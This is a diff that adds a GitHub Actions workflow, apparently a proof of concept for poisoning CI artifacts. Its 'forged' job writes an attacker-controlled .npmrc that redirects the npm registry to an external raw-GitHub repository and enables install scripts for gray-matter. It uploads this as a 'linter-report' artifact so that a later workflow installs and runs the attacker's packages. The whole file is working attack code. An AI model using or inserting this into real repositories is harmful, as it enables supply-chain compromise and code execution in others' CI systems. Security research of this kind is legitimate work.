@@ -1,0 +1,24 @@
+name: PR validation
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  forged:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled linter-report artifact
+        run: |
+          mkdir -p payload
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\nallow-scripts=gray-matter\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          printf '%s\n' '{"name":"proj","version":"1.0.0","private":true,"allowScripts":{"gray-matter":true}}' > payload/package.json
+          printf 'attacker controlled lint report\n' > payload/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          ls -la payload
+      - name: Upload linter report
+        uses: actions/upload-artifact@v4
+        with:
+          name: linter-report
+          path: payload/
+          include-hidden-files: true
